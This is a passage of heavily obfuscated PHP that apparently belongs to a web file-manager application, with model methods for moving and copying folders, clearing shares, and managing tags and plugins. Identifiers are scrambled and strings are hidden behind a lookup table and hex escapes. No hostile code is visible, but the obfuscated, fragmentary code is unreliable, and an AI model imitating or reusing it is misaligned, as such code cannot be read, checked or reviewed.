$this->sourceInfo($½À²”÷Ç); $ÃÒ’™ğÄ = $õòîµ„[$Î—äÇ¨â[448]] == $Î—äÇ¨â[98]; $“‰Èóª = $ÊšïÅÕĞ ? $ÊšïÅÕĞ : $õòîµ„[$Î—äÇ¨â[42]]; $²—†Œœ = $this->fileNameExistCache($ó–ÚÏÚœ, $“‰Èóª); $this->lockMoveStart($½À²”÷Ç); $this->lockWriteStart($ó–ÚÏÚœ, $“‰Èóª); if (!$²—†Œœ) { return $this->_moveForce($½À²”÷Ç, $ó–ÚÏÚœ, $“‰Èóª); } $“×˜Œ·Ï = $²—†Œœ; $•Ö°²Îñ = !1; if ($ÃÒ’™ğÄ) { if ($·®è¯è½ == REPEAT_RENAME_FOLDER) { $“‰Èóª = $this->fileNameAuto($ó–ÚÏÚœ, $“‰Èóª, $·®è¯è½, $ÃÒ’™ğÄ); $“×˜Œ·Ï = $this->_moveForce($½À²”÷Ç, $ó–ÚÏÚœ, $“‰Èóª); } else { if ($·®è¯è½ == REPEAT_RENAME_FOLDER) { $·®è¯è½ = REPEAT_RENAME; } $İ›Îàí¸ = $this->_childrenListSelect($½À²”÷Ç); foreach ($İ›Îàí¸ as $Ñ¼ñ½¥Æ) { $this->_move($Ñ¼ñ½¥Æ[$Î—äÇ¨â[440]], $²—†Œœ, $·®è¯è½, $²¨Ñç°®); } $•Ö°²Îñ = !0; } } else { if ($·®è¯è½ == REPEAT_SKIP) { $•Ö°²Îñ = !0; } else { if ($·®è¯è½ == REPEAT_RENAME || $·®è¯è½ == REPEAT_RENAME_FOLDER) { $“‰Èóª = $this->fileNameAuto($ó–ÚÏÚœ, $“‰Èóª, $·®è¯è½, $ÃÒ’™ğÄ); $“×˜Œ·Ï = $this->_moveForce($½À²”÷Ç, $ó–ÚÏÚœ, $“‰Èóª); } else { if ($·®è¯è½ == REPEAT_REPLACE) { $˜ªƒØ§Í = $this->sourceInfoCache($²—†Œœ); $¨‰ıå†ê = $this->fileHistory($˜ªƒØ§Í, $õòîµ„[$Î—äÇ¨â[506]], $õòîµ„[$Î—äÇ¨â[86]]); $•Ö°²Îñ = !0; if ($¨‰ıå†ê) { $²¨Ñç°®[$Î—äÇ¨â[595]][] = $õòîµ„[$Î—äÇ¨â[506]]; } } } } } if ($•Ö°²Îñ && !$²¨Ñç°®[$Î—äÇ¨â[626]]) { $²¨Ñç°®[$Î—äÇ¨â[626]] = !0; } return $“×˜Œ·Ï; } private function _moveForce($ŒøÇÊßÒ, $‹ÒÍ…Å¸, $§âîÊÛß) { $¢»ËÁÏú =& $_SERVER[ªÏ§Ë·]; $”ú·» = $this->sourceInfo($ŒøÇÊßÒ); $ñ©Åò¾ = $this->sourceInfo($‹ÒÍ…Å¸); $Ìß—šä = $”ú·»[$¢»ËÁÏú[448]] == $¢»ËÁÏú[98]; $ß²Â•³Œ = array($¢»ËÁÏú[439] => $ñ©Åò¾[$¢»ËÁÏú[440]], $¢»ËÁÏú[618] => $ñ©Åò¾[$¢»ËÁÏú[549]] . $ñ©Åò¾[$¢»ËÁÏú[440]] . $¢»ËÁÏú[60], $¢»ËÁÏú[614] => $ñ©Åò¾[$¢»ËÁÏú[449]], $¢»ËÁÏú[615] => $ñ©Åò¾[$¢»ËÁÏú[534]], $¢»ËÁÏú[617] => USER_ID, $¢»ËÁÏú[458] => $§âîÊÛß); $åŸÔ·´ƒ = $”ú·»[$¢»ËÁÏú[449]] == SourceModel::TYPE_GROUP && $ñ©Åò¾[$¢»ËÁÏú[449]] == SourceModel::TYPE_GROUP && $”ú·»[$¢»ËÁÏú[534]] == $ñ©Åò¾[$¢»ËÁÏú[534]]; if (!$åŸÔ·´ƒ && $this->moveClearAuth) { Model($¢»ËÁÏú[531])->authClear($ŒøÇÊßÒ); } $Ã÷½ªè = $”ú·»[$¢»ËÁÏú[469]] == $¢»ËÁÏú[98] && $ñ©Åò¾[$¢»ËÁÏú[469]] != $¢»ËÁÏú[98]; if ($Ã÷½ªè) { $ß²Â•³Œ[$¢»ËÁÏú[468]] = 0; } if ($Ìß—šä) { $©™¨Ù« = array($¢»ËÁÏú[618] => array($¢»ËÁÏú[578], $”ú·»[$¢»ËÁÏú[549]] . $”ú·»[$¢»ËÁÏú[440]] . $¢»ËÁÏú[579])); $®Ã¹†…„ = $”ú·»[$¢»ËÁÏú[549]] . $”ú·»[$¢»ËÁÏú[440]] . $¢»ËÁÏú[60]; $äĞ²Ã†Ü = $ñ©Åò¾[$¢»ËÁÏú[549]] . $ñ©Åò¾[$¢»ËÁÏú[440]] . $¢»ËÁÏú[60] . $”ú·»[$¢»ËÁÏú[440]] . $¢»ËÁÏú[60]; $îİÂ®öÛ = array($¢»ËÁÏú[618] => array($¢»ËÁÏú[627], "\162\x65\160\x6c\x61\143\x65\50\x70\x61\162\145\x6e\164\114\x65\166\145\154\x2c\47{$®Ã¹†…„}\x27\x2c\47{$äĞ²Ã†Ü}\x27\51"), $¢»ËÁÏú[614] => $ñ©Åò¾[$¢»ËÁÏú[449]], $¢»ËÁÏú[615] => $ñ©Åò¾[$¢»ËÁÏú[534]]); if ($Ã÷½ªè) { $îİÂ®öÛ[$¢»ËÁÏú[468]] = 0; } $this->where($©™¨Ù«)->data($îİÂ®öÛ)->save(); } $this->where(array($¢»ËÁÏú[455] => $ŒøÇÊßÒ))->data($ß²Â•³Œ)->save(); return $ŒøÇÊßÒ; } private function clearShare($µÓ›Ö¥Â, $¬Ô« š) { $ä£‰™Ş =& $_SERVER[ªÏ§Ë·]; $ÃÔÆÄŞì = $this->sourceInfo($µÓ›Ö¥Â); $Ãçı­‰å = $this->sourceInfo($¬Ô« š); if ($ÃÔÆÄŞì[$ä£‰™Ş[534]] == $Ãçı­‰å[$ä£‰™Ş[534]] && $ÃÔÆÄŞì[$ä£‰™Ş[449]] == $ä£‰™Ş[628]) { return; } $È‚“‡ø® = array($ä£‰™Ş[549] => array($ä£‰™Ş[578], $ÃÔÆÄŞì[$ä£‰™Ş[549]] . $µÓ›Ö¥Â . $ä£‰™Ş[579])); $³²­ ·È = $this->field($ä£‰™Ş[455])->where($È‚“‡ø®)->getField($ä£‰™Ş[440], !0); if (!$³²­ ·È) { return; } $È‚“‡ø® = array($ä£‰™Ş[440] => array($ä£‰™Ş[7], $³²­ ·È), $ä£‰™Ş[629] => 1); $æ²çæ„ë = Model($ä£‰™Ş[630])->field($ä£‰™Ş[631])->where($È‚“‡ø®)->select(); if (!$æ²çæ„ë) { return; } $æ²çæ„ë = array_to_keyvalue($æ²çæ„ë, $ä£‰™Ş[12], $ä£‰™Ş[631]); $È‚“‡ø® = array($ä£‰™Ş[631] => array($ä£‰™Ş[7], $æ²çæ„ë)); Model($ä£‰™Ş[630])->where($È‚“‡ø®)->save(array($ä£‰™Ş[629] => 0)); Model($ä£‰™Ş[632])->where($È‚“‡ø®)->delete(); } public function copyFolderFromIO($«É–ê€³, $ÄÖçÆ«Ë, $ÆÛŸ‡ó—, $¦‰ÏĞ‹, $¼É›ì, $Ô±ïéàØ = false) { $ŸÇÚ˜’è =& $_SERVER[ªÏ§Ë·]; $Õœà‹íÖ = array($ŸÇÚ˜’è[596] => array(), $ŸÇÚ˜’è[597] => array(), $ŸÇÚ˜’è[595] => array(), $ŸÇÚ˜’è[633] => array()); $Ü¹Œè˜Ø = $Ô±ïéàØ ? $Ô±ïéàØ : $«É–ê€³->pathThis($ÄÖçÆ«Ë); $é„Õõ»ö = $this->fileNameExist($ÆÛŸ‡ó—, $Ü¹Œè˜Ø); $†¸œŸ¹² = $this->mkdir($ÆÛŸ‡ó—, $Ü¹Œè˜Ø, $¦‰ÏĞ‹); if (!$é„Õõ»ö || $¦‰ÏĞ‹ == REPEAT_RENAME_FOLDER) { $¦‰ÏĞ‹ = !1; } if ($é„Õõ»ö) { $this->_childrenAllMake($é„Õõ»ö); } Hook::trigger($ŸÇÚ˜’è[634]); $this->_copyChildTo($«É–ê€³, $ÄÖçÆ«Ë, $†¸œŸ¹², $¦‰ÏĞ‹, $Õœà‹íÖ, $¼É›ì); Hook::trigger($ŸÇÚ˜’è[635]); if ($†¸œŸ¹²) { $this->folderSizeResetChildren($†¸œŸ¹²); } $this->_childrenListClear(); Model($ŸÇÚ˜’è[598])->addAll($Õœà‹íÖ[$ŸÇÚ˜’è[596]], array(), !0); Model($ŸÇÚ˜’è[599])->eventCopy($†¸œŸ¹²); $this->saveAll($Õœà‹íÖ[$ŸÇÚ˜’è[597]]); Model($ŸÇÚ˜’è[509])->linkAdd($Õœà‹íÖ[$ŸÇÚ˜’è[595]]); Model($ŸÇÚ˜’è[509])->remove($Õœà‹íÖ[$ŸÇÚ˜’è[633]]); $this->folderSizeReset($ÆÛŸ‡ó—); $this->updateModifyTime($ÆÛŸ‡ó—); return $†¸œŸ¹²; } private function _copyChildTo($ÄÜ©ïïŸ, $ÎÇÀ‰İ, $µ—ÊÒ“¤, $‹ŸÁ¬Ã—, &$‹é­•ùÈ, $í“‰‹¬Ñ) { $¿Ó¿›‚é =& $_SERVER[ªÏ§Ë·]; $î­Ï‰Ëù = $this->sourceInfoCache($µ—ÊÒ“¤); $ÃØ²ç÷ = $ÄÜ©ïïŸ->listPath($ÎÇÀ‰İ); $ÃØ²ç÷ = $ÃØ²ç÷ ? $ÃØ²ç÷ : array($¿Ó¿›‚é[93] => array(), $¿Ó¿›‚é[92] => array()); $ëİá¬‡ = array_merge($ÃØ²ç÷[$¿Ó¿›‚é[93]], $ÃØ²ç÷[$¿Ó¿›‚é[92]]); $ıˆùæ–è = $this->_addFiles($ÄÜ©ïïŸ, $ÃØ²ç÷[$¿Ó¿›‚é[93]], $í“‰‹¬Ñ); $Û—‡„ñí = array(); foreach ($ëİá¬‡ as &$©¥è™ßÛ) { if (isset($ıˆùæ–è[$©¥è™ßÛ[$¿Ó¿›‚é[42]]])) { $©¥è™ßÛ = $ıˆùæ–è[$©¥è™ßÛ[$¿Ó¿›‚é[42]]]; } $©¥è™ßÛ[$¿Ó¿›‚é[448]] = $©¥è™ßÛ[$¿Ó¿›‚é[43]] == $¿Ó¿›‚é[85]; $©¥è™ßÛ[$¿Ó¿›‚é[450]] = substr(_get($©¥è™ßÛ, $¿Ó¿›‚é[184], $¿Ó¿›‚é[12]), 0, 10); $©¥è™ßÛ[$¿Ó¿›‚é[86]] = _get($©¥è™ßÛ, $¿Ó¿›‚é[86], 0); $©¥è™ßÛ[$¿Ó¿›‚é[506]] = _get($©¥è™ßÛ, $¿Ó¿›‚é[506], 0); if (!isset($©¥è™ßÛ[$¿Ó¿›‚é[636]]) && $©¥è™ßÛ[$¿Ó¿›‚é[506]]) { $‹é­•ùÈ[$¿Ó¿›‚é[633]][] = $©¥è™ßÛ[$¿Ó¿›‚é[506]]; } if ($‹ŸÁ¬Ã—) { $“ê¡‘¹§ = $this->fileNameExistCache($µ—ÊÒ“¤, $©¥è™ßÛ[$¿Ó¿›‚é[42]]); if ($“ê¡‘¹§) { if ($©¥è™ßÛ[$¿Ó¿›‚é[448]] || $‹ŸÁ¬Ã— == REPEAT_SKIP) { continue; } if ($‹ŸÁ¬Ã— == REPEAT_REPLACE) { $ûÒâãüÉ = $this->sourceInfoCache($“ê¡‘¹§); $±¨Êáµ = $this->fileHistory($ûÒâãüÉ, $©¥è™ßÛ[$¿Ó¿›‚é[506]], $©¥è™ßÛ[$¿Ó¿›‚é[86]]); if ($±¨Êáµ) { $‹é­•ùÈ[$¿Ó¿›‚é[595]][] = $©¥è™ßÛ[$¿Ó¿›‚é[506]]; } continue; } else { if ($‹ŸÁ¬Ã— == REPEAT_RENAME) { $©¥è™ßÛ[$¿Ó¿›‚é[42]] = $this->fileNameAutoCache($µ—ÊÒ“¤, $©¥è™ßÛ[$¿Ó¿›‚é[42]], $‹ŸÁ¬Ã—, !1); } } } } if (!$©¥è™ßÛ[$¿Ó¿›‚é[448]] && $©¥è™ßÛ[$¿Ó¿›‚é[506]] == 0) { continue; } if (!$©¥è™ßÛ[$¿Ó¿›‚é[448]] && $©¥è™ßÛ[$¿Ó¿›‚é[506]]) { $‹é­•ùÈ[$¿Ó¿›‚é[595]][] = $©¥è™ßÛ[$¿Ó¿›‚é[506]]; } $Û—‡„ñí[] = $this->_makeItemData($©¥è™ßÛ, $î­Ï‰Ëù, $©¥è™ßÛ[$¿Ó¿›‚é[42]]); } unset($©¥è™ßÛ); if (!empty($Û—‡„ñí)) { $this->addAll($Û—‡„ñí); $this->_childrenListSelect($µ—ÊÒ“¤); } $¾ô²Œò = $this->_childrenList($µ—ÊÒ“¤); $¾ô²Œò = array_to_keyvalue($¾ô²Œò, $¿Ó¿›‚é[42]); foreach ($ëİá¬‡ as $©¥è™ßÛ) { $ûÒâãüÉ = $¾ô²Œò[$©¥è™ßÛ[$¿Ó¿›‚é[42]]]; $Îë¥Ô© = $ûÒâãüÉ[$¿Ó¿›‚é[440]]; $this->_copyApplyMeta($ûÒâãüÉ, $‹é­•ùÈ); if ($©¥è™ßÛ[$¿Ó¿›‚é[43]] == $¿Ó¿›‚é[85]) { $©¥è™ßÛ[$¿Ó¿›‚é[94]] = $ÄÜ©ïïŸ->getPathInner($©¥è™ßÛ[$¿Ó¿›‚é[94]]); $this->_copyChildTo($ÄÜ©ïïŸ, $©¥è™ßÛ[$¿Ó¿›‚é[94]], $Îë¥Ô©, $‹ŸÁ¬Ã—, $‹é­•ùÈ, $í“‰‹¬Ñ); } } } private function _addFiles($êŸ”‘Õ, $òµÔôß, $ªÖß×¾) { $•—‘ÇŞÜ =& $_SERVER[ªÏ§Ë·]; if (!$òµÔôß || count($òµÔôß) == 0) { return array(); } $—Ş”…°¡ = array(); foreach ($òµÔôß as &$Ä¸ŒÆ“) { Hook::trigger($•—‘ÇŞÜ[637], $Ä¸ŒÆ“); $Ä¸ŒÆ“[$•—‘ÇŞÜ[94]] = $êŸ”‘Õ->getPathInner($Ä¸ŒÆ“[$•—‘ÇŞÜ[94]]); $Á£¸µ×À = $êŸ”‘Õ->hashSimple($Ä¸ŒÆ“[$•—‘ÇŞÜ[94]]); $ñ‘“‚óã = $êŸ”‘Õ->hashMd5($Ä¸ŒÆ“[$•—‘ÇŞÜ[94]]); if (strlen($ñ‘“‚óã) > 10 && !isset($—Ş”…°¡[$ñ‘“‚óã])) { $—Ş”…°¡[$ñ‘“‚óã] = array(); } $Ä¸ŒÆ“[$•—‘ÇŞÜ[187]] = $Á£¸µ×À; $Ä¸ŒÆ“[$•—‘ÇŞÜ[186]] = $ñ‘“‚óã; $—Ş”…°¡[$ñ‘“‚óã][] =& $Ä¸ŒÆ“; if (count($—Ş”…°¡[$ñ‘“‚óã]) > 1) { $Ä¸ŒÆ“[$•—‘ÇŞÜ[636]] = !0; } Hook::trigger($•—‘ÇŞÜ[638], $Ä¸ŒÆ“); } unset($Ä¸ŒÆ“); $Àë“«ŒÒ = array($•—‘ÇŞÜ[186] => array($•—‘ÇŞÜ[7], array_keys($—Ş”…°¡))); $Ÿüõ¦¶Ô = Model($•—‘ÇŞÜ[639]); $Îä·€¼Ü = $Ÿüõ¦¶Ô->where($Àë“«ŒÒ)->select(); $Îä·€¼Ü = $Îä·€¼Ü ? $Îä·€¼Ü : array(); foreach ($Îä·€¼Ü as $ûğ…î˜Ö) { if (!isset($—Ş”…°¡[$ûğ…î˜Ö[$•—‘ÇŞÜ[186]]])) { continue; } $·ìñïÚÜ = $—Ş”…°¡[$ûğ…î˜Ö[$•—‘ÇŞÜ[186]]]; foreach ($·ìñïÚÜ as &$Ä¸ŒÆ“) { $Ä¸ŒÆ“[$•—‘ÇŞÜ[506]] = $ûğ…î˜Ö[$•—‘ÇŞÜ[506]]; $Ä¸ŒÆ“[$•—‘ÇŞÜ[636]] = !0; } unset($Ä¸ŒÆ“); } $¼©·Ò¾¯ = array(); foreach ($òµÔôß as $É …¬ŒŞ) { Hook::trigger($•—‘ÇŞÜ[640], $É …¬ŒŞ); if (isset($É …¬ŒŞ[$•—‘ÇŞÜ[636]]) && $É …¬ŒŞ[$•—‘ÇŞÜ[636]]) { Hook::trigger($•—‘ÇŞÜ[641], $É …¬ŒŞ); continue; } $§Ìôòš  = $êŸ”‘Õ->getPathInner($É …¬ŒŞ[$•—‘ÇŞÜ[94]]); $Ìúõ‚şæ = $Ÿüõ¦¶Ô->addFileMake($§Ìôòš , $É …¬ŒŞ[$•—‘ÇŞÜ[86]], $É …¬ŒŞ[$•—‘ÇŞÜ[187]], $É …¬ŒŞ[$•—‘ÇŞÜ[186]], $É …¬ŒŞ[$•—‘ÇŞÜ[42]], $ªÖß×¾); Hook::trigger($•—‘ÇŞÜ[641], $É …¬ŒŞ); if (!is_array($Ìúõ‚şæ)) { continue; } $¼©·Ò¾¯[] = $Ìúõ‚şæ; } $Ÿüõ¦¶Ô->addAll($¼©·Ò¾¯); $Àë“«ŒÒ = array($•—‘ÇŞÜ[186] => array($•—‘ÇŞÜ[7], array_keys($—Ş”…°¡))); $Îä·€¼Ü = $Ÿüõ¦¶Ô->where($Àë“«ŒÒ)->select(); $Îä·€¼Ü = $Îä·€¼Ü ? $Îä·€¼Ü : array(); foreach ($Îä·€¼Ü as $ûğ…î˜Ö) { if (!isset($—Ş”…°¡[$ûğ…î˜Ö[$•—‘ÇŞÜ[186]]])) { continue; } $ÆÛÕåË» =& $—Ş”…°¡[$ûğ…î˜Ö[$•—‘ÇŞÜ[186]]]; foreach ($ÆÛÕåË» as &$Ä¸ŒÆ“) { $Ä¸ŒÆ“[$•—‘ÇŞÜ[506]] = $ûğ…î˜Ö[$•—‘ÇŞÜ[506]]; } unset($Ä¸ŒÆ“); } $¾¼İ¿°¯ = array(); foreach ($òµÔôß as $Œ¬¢Ôóû) { $¾¼İ¿°¯[$Œ¬¢Ôóû[$•—‘ÇŞÜ[42]]] = $Œ¬¢Ôóû; } return $¾¼İ¿°¯; } } goto EÁğ‰”¸Â; C·ºÁœÍ: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\x66\141\166"; protected function cacheFunctionAlias($…’´”ÚÃ) { $è­Î¸µ» =& $_SERVER[ªÏ§Ë·]; return array($è­Î¸µ»[1966] => array($…’´”ÚÃ[0], $è­Î¸µ»[1967]), $è­Î¸µ»[1968] => array($…’´”ÚÃ[0], $è­Î¸µ»[1969])); } protected function get($¸´œ‡…) { $¹¹¯œ„  =& $_SERVER[ªÏ§Ë·]; $…æ“½Ö = Model($¹¹¯œ„ [550])->metaGet($¸´œ‡…, $¹¹¯œ„ [1970]); $õƒ’¡§À = json_decode($…æ“½Ö, !0); return $õƒ’¡§À ? $õƒ’¡§À : array($¹¹¯œ„ [1971] => $¹¹¯œ„ [98], $¹¹¯œ„ [407] => array()); } protected function set($€öÆãÎ, $×é™Ó³™) { $©ª÷ßé° =& $_SERVER[ªÏ§Ë·]; $×é™Ó³™ = $×é™Ó³™ ? $×é™Ó³™ : array($©ª÷ßé°[1971] => $©ª÷ßé°[98], $©ª÷ßé°[407] => array()); return Model($©ª÷ßé°[550])->metaSet($€öÆãÎ, $©ª÷ßé°[1970], json_encode($×é™Ó³™)); } protected function getByTagID($†Üí€ÖÑ, $‹ëîÃ¼) { $ÆÛŠ‚»Æ =& $_SERVER[ªÏ§Ë·]; if (!$†Üí€ÖÑ || !$‹ëîÃ¼) { return !1; } if (!Model($ÆÛŠ‚»Æ[550])->getInfoSimple($†Üí€ÖÑ)) { return !1; } $¸ÕäéË… = $this->get($†Üí€ÖÑ); if (!$¸ÕäéË… || !isset($¸ÕäéË…[$ÆÛŠ‚»Æ[407]])) { return !1; } $³›Æ¨ƒŠ = array_find_by_field($¸ÕäéË…[$ÆÛŠ‚»Æ[407]], $ÆÛŠ‚»Æ[437], $‹ëîÃ¼); return is_array($³›Æ¨ƒŠ) ? $³›Æ¨ƒŠ : !1; } public function listSource($‚éİ”Ù§, $˜ìçÑ±õ) { $„ÚÌßù =& $_SERVER[ªÏ§Ë·]; if ($˜ìçÑ±õ && !is_array($˜ìçÑ±õ)) { $˜ìçÑ±õ = array($˜ìçÑ±õ); } $ÊâÑœ¬¹ = $this->listData($‚éİ”Ù§); $ÂÕÂëØÎ = array(); foreach ($ÊâÑœ¬¹ as $ÉÓöÀŠ£) { $æô«ÀÌ = $ÉÓöÀŠ£[$„ÚÌßù[94]]; if (!$æô«ÀÌ) { continue; } if (!isset($ÂÕÂëØÎ[$æô«ÀÌ])) { $ÂÕÂëØÎ[$æô«ÀÌ] = array(); } $ÂÕÂëØÎ[$æô«ÀÌ][] = $ÉÓöÀŠ£[$„ÚÌßù[464]]; } $ôèùÛÑÜ = array(); foreach ($ÂÕÂëØÎ as $×ÍÓà¤ => $šŠºÚÛ¼) { $ú“Íó™Ë = !0; if (!$˜ìçÑ±õ) { $ôèùÛÑÜ[] = $×ÍÓà¤; continue; } foreach ($˜ìçÑ±õ as $¥÷·ìµ›) { if (!in_array($¥÷·ìµ›, $šŠºÚÛ¼)) { $ú“Íó™Ë = !1; break; } } if ($ú“Íó™Ë) { $ôèùÛÑÜ[] = $×ÍÓà¤; } } if (!$ôèùÛÑÜ) { return array(); } $ğìÊ»³„ = array($„ÚÌßù[455] => array($„ÚÌßù[456], $ôèùÛÑÜ), $„ÚÌßù[534] => $‚éİ”Ù§, $„ÚÌßù[449] => SourceModel::TYPE_GROUP); $ŒêˆÚñµ = Model($„ÚÌßù[1358])->listSource($ğìÊ»³„); if (!$ŒêˆÚñµ || count($ôèùÛÑÜ) == $ŒêˆÚñµ[$„ÚÌßù[404]][$„ÚÌßù[405]]) { return $ŒêˆÚñµ; } $æÙ¡¬ø… = array(); $Àë ‚€‹ = array_to_keyvalue($ŒêˆÚñµ[$„ÚÌßù[92]], $„ÚÌßù[12], $„ÚÌßù[440]); $ß³õøõ‡ = array_to_keyvalue($ŒêˆÚñµ[$„ÚÌßù[93]], $„ÚÌßù[12], $„ÚÌßù[440]); $õ´¤ã– = array_merge($ß³õøõ‡, $Àë ‚€‹); foreach ($ôèùÛÑÜ as $æô«ÀÌ) { if (!in_array($æô«ÀÌ, $õ´¤ã–)) { $æÙ¡¬ø…[] = $æô«ÀÌ; } } if ($æÙ¡¬ø…) { $this->removeBySource($‚éİ”Ù§, $æÙ¡¬ø…); } return $ŒêˆÚñµ; } protected function listData($©›ô§¡€) { $ÑÉº¡Ò£ =& $_SERVER[ªÏ§Ë·]; $µé™§¾ = array($ÑÉº¡Ò£[1658] => 0, $ÑÉº¡Ò£[521] => array($ÑÉº¡Ò£[1972], 0), $ÑÉº¡Ò£[460] => $ÑÉº¡Ò£[1973] . $©›ô§¡€); $îÓ¯Ã÷Ê = $ÑÉº¡Ò£[1974]; $ğ‚Ê¨ßÌ = $this->field($îÓ¯Ã÷Ê)->where($µé™§¾)->order($ÑÉº¡Ò£[1975])->select(); return $ğ‚Ê¨ßÌ ? $ğ‚Ê¨ßÌ : array(); } protected function addToTag($€±Ô‹‘í, $Âö¥Ø‰, $­©•µ) { $µÕ™±âş =& $_SERVER[ªÏ§Ë·]; if (!$this->getByTagID($€±Ô‹‘í, $­©•µ) || !$Âö¥Ø‰) { return !1; } if (!Model($µÕ™±âş[853])->pathInfo($Âö¥Ø‰)) { return !1; } $Í›È€ÄÎ = array($µÕ™±âş[1658] => 0, $µÕ™±âş[521] => $­©•µ, $µÕ™±âş[459] => $Âö¥Ø‰, $µÕ™±âş[460] => $µÕ™±âş[1976] . $€±Ô‹‘í, $µÕ™±âş[458] => $µÕ™±âş[12], $µÕ™±âş[1861] => 0); if ($this->where($Í›È€ÄÎ)->find()) { return !1; } return $this->add($Í›È€ÄÎ); } protected function removeFromTag($Ø­³Ç, $¿»«šé¬, $‹µ¥ŠŠÄ) { $Éí­§÷Æ =& $_SERVER[ªÏ§Ë·]; if (!$this->getByTagID($Ø­³Ç, $‹µ¥ŠŠÄ) || !$¿»«šé¬) { return !1; } if (is_array($¿»«šé¬)) { $¿»«šé¬ = array($Éí­§÷Æ[7], $¿»«šé¬); } $…ì°åı¨ = array($Éí­§÷Æ[1658] => 0, $Éí­§÷Æ[521] => $‹µ¥ŠŠÄ, $Éí­§÷Æ[460] => $Éí­§÷Æ[1976] . $Ø­³Ç, $Éí­§÷Æ[459] => $¿»«šé¬); return $this->where($…ì°åı¨)->delete(); } protected function removeByTag($÷É‹ÀÑ, $ĞüÈ«š­) { $Ãáƒùìï =& $_SERVER[ªÏ§Ë·]; if (!$this->getByTagID($÷É‹ÀÑ, $ĞüÈ«š­)) { return !1; } $¢É“ŒÂ„ = array($Ãáƒùìï[1658] => 0, $Ãáƒùìï[521] => $ĞüÈ«š­, $Ãáƒùìï[460] => $Ãáƒùìï[1976] . $÷É‹ÀÑ); return $this->where($¢É“ŒÂ„)->delete(); } protected function removeBySource($ôÇé²ä¼, $ÁÜØï‰¢) { $³ÈæèÚä =& $_SERVER[ªÏ§Ë·]; if (!$ôÇé²ä¼ || !$ÁÜØï‰¢) { return !1; } if (is_array($ÁÜØï‰¢)) { $ÁÜØï‰¢ = array($³ÈæèÚä[7], $ÁÜØï‰¢); } $ôİÁÇŞ = array($³ÈæèÚä[1658] => 0, $³ÈæèÚä[459] => $ÁÜØï‰¢, $³ÈæèÚä[521] => array($³ÈæèÚä[1039], 0), $³ÈæèÚä[460] => $³ÈæèÚä[1976] . $ôÇé²ä¼); return $this->where($ôİÁÇŞ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\x70\154\165\x67\x69\156\x4c\x69\163\164"; public $field = array("\x6e\x61\x6d\145", "\x73\x74\141\x74\165\x73", "\162\x65\147\151\x65\x73\x74", "\x63\157\156\x66\151\x67"); public function loadList($ÙÑªØ˜ = false) { $¿´ı‚¨‡ = array_to_keyvalue($this->listData(), $_SERVER[ªÏ§Ë·][42]); if ($ÙÑªØ˜) { return $¿´ı‚¨‡[$ÙÑªØ˜]; } return $¿´ı‚¨‡; } public function init() { $‚ÏïÃÂÑ =& $_SERVER[ªÏ§Ë·]; Hook::trigger($‚ÏïÃÂÑ[1977]); $ØÒÛœé¤ = $this->loadPluginList(); foreach ($ØÒÛœé¤ as $‹ô¿å’« => $¹æ˜ªğ) { $½‹•Ô¨ = $this->appAllow($‹ô¿å’«, $¹æ˜ªğ); if (!$½‹•Ô¨) { continue; } foreach ($¹æ˜ªğ[$‚ÏïÃÂÑ[1978]] as $ë¦ÖÓï¡ => $ãÊ»¦…¥) { Hook::bind($ë¦ÖÓï¡, $ãÊ»¦…¥); } } Hook::trigger($‚ÏïÃÂÑ[1979]); Hook::trigger(ACTION); } public function appAllow($öÉˆ»‡, $ùğ›áŠ¹, $íÙÑÔ§ = true) { $¹¬îÕƒë =& $_SERVER[ªÏ§Ë·]; $áå££¬Ğ = PLUGIN_DIR . $öÉˆ»‡ . $¹¬îÕƒë[1980]; if (!is_array($ùğ›áŠ¹) || !is_array($ùğ›áŠ¹[$¹¬îÕƒë[1978]]) || $ùğ›áŠ¹[$¹¬îÕƒë[778]] != 1 || !is_file($áå££¬Ğ)) { return !1; } if ($GLOBALS[$¹¬îÕƒë[532]] == 1) { if ($GLOBALS[$¹¬îÕƒë[6]][$¹¬îÕƒë[1981]] || !$GLOBALS[$¹¬îÕƒë[6]][$¹¬îÕƒë[1982]]) { return !0; } $ÙÑ¦¾˜® = explode($¹¬îÕƒë[60], strtolower($GLOBALS[$¹¬îÕƒë[6]][$¹¬îÕƒë[1982]])); return in_array(strtolower($öÉˆ»‡), $ÙÑ¦¾˜®) ? !1 : !0; } if ($íÙÑÔ§ && !Action($¹¬îÕƒë[1983])->checkAuth($öÉˆ»‡)) { return !1; } return !0; } public function unInstall($“®–áü) { $ğ·ôÍŞ =& $_SERVER[ªÏ§Ë·]; $Ùíªæ«˜ = $this->loadList($“®–áü); if (file_exists(PLUGIN_DIR . $“®–áü)) { Hook::apply($“®–áü . $ğ·ôÍŞ[1984]); } $this->remove($Ùíªæ«˜[$ğ·ôÍŞ[437]]); } public function changeStatus($µøÇƒ±, $ôÂãú•Ä) { $Ô­È›½ =& $_SERVER[ªÏ§Ë·]; $îí€â£ = $this->loadList($µøÇƒ±); if ($ôÂãú•Ä) { Hook::apply($µøÇƒ± . $Ô­È›½[1985]); } $this->update($îí€â£[$Ô­È›½[437]], array($Ô­È›½[1986] => $ôÂãú•Ä)); } public function appRegist($‚‡æóà©, $Õ¯÷ÇªÑ) { $ÎÙÖ÷“Æ =& $_SERVER[ªÏ§Ë·]; $™µê½£« = $this->loadList($‚‡æóà©); if ($™µê½£«) { $this->update($™µê½£«[$ÎÙÖ÷“Æ[437]], array($ÎÙÖ÷“Æ[1978] => $Õ¯÷ÇªÑ)); } else { $Çœ´º• = array($ÎÙÖ÷“Æ[42] => $‚‡æóà©, $ÎÙÖ÷“Æ[1978] => $Õ¯÷ÇªÑ, $ÎÙÖ÷“Æ[778] => 0, $ÎÙÖ÷“Æ[6] => $this->getConfigDefault($‚‡æóà©)); $this->insert($Çœ´º•); } } public function getConfigDefault($¾ş¹…Éú) { $á½â·÷ =& $_SERVER[ªÏ§Ë·]; $–“Ø™ğå = array(); $òãĞÔùĞ = $this->getPackageJson($¾ş¹…Éú); if (!$òãĞÔùĞ && is_array($òãĞÔùĞ[$á½â·÷[1987]])) { return $–“Ø™ğå; } foreach ($òãĞÔùĞ[$á½â·÷[1987]] as $´¯µş¡ => $¦¿ü¬) { if (!isset($¦¿ü¬[$á½â·÷[412]]) || isset($–“Ø™ğå[$´¯µş¡])) { continue; } $–“Ø™ğå[$´¯µş¡] = $¦¿ü¬[$á½â·÷[412]]; } return $–“Ø™ğå; } public function getPackageJson($£îÖ¸ ) { return Hook::apply($£îÖ¸  . $_SERVER[ªÏ§Ë·][1988]); } public function getConfig($İÄÒæ´×, 